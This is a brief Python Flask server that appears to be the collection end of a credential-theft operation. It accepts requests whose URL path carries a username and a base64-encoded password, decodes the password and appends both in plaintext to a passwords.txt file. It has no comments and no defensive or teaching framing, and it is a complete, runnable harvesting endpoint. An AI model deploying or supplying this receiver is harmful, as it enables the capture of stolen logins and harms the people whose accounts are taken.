from flask import Flask, request, jsonify
import base64

app = Flask(__name__)

@app.route('/<string:receiver>', methods=['GET'])
def get_receiver(receiver):
    aux = receiver.split(':')
    user = aux[0]
    password = aux[1]
    password = base64.b64decode(password).decode()
    f = open("passwords.txt", "a")
    f.write(user + ":" + password + "\n")
    f.close()
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=41312)